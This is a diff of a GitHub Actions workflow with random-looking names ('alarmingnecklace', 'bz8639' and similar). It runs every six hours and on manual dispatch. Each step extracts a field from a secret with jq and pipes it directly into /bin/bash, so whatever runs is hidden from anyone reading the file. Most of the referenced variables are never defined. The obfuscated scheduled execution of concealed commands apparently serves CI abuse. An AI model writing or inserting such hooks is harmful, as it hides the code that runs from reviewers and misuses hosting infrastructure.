@@ -1,9 +1,8 @@
 name: alarmingnecklace
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 5/6 * * *'
+    - cron: '16 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +10,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: alarmingnecklace
         env:
-          r21500: ${{ secrets.r21500 }}
+          bz8639: ${{ secrets.bz8639 }}
         run: |
-          echo $r21500 | jq -r .zq6 | /bin/bash
-          echo $if1951 | jq -r .b288 | /bin/bash
-          echo $gwmig33 | jq -r .sqi020 | /bin/bash
-          echo $r1 | jq -r .k29326 | /bin/bash
-          echo $b51 | jq -r .w44434 | /bin/bash
-          echo $qduk17173 | jq -r .xk56 | /bin/bash
-          echo $ugpp3276 | jq -r .cd365 | /bin/bash
-          echo $ew0 | jq -r .nqbpe50485 | /bin/bash
-          echo $p7172 | jq -r .slprd4726 | /bin/bash
-          echo $ge78982 | jq -r .x217 | /bin/bash
+          echo $bz8639 | jq -r .tnadp1482 | /bin/bash
+          echo $rlu2604 | jq -r .anvy54 | /bin/bash
+          echo $go135 | jq -r .uzb284 | /bin/bash
+          echo $rc513 | jq -r .ii2721 | /bin/bash
+          echo $smjv3 | jq -r .xipu56878 | /bin/bash
+          echo $wno38 | jq -r .gfjcz0 | /bin/bash
+          echo $kwwb402 | jq -r .dwfs88 | /bin/bash
+          echo $myt225 | jq -r .noge8369 | /bin/bash
+          echo $tm63038 | jq -r .w291 | /bin/bash
+          echo $qahd17 | jq -r .rplwk31 | /bin/bash
+          echo $uas4 | jq -r .co067 | /bin/bash
 
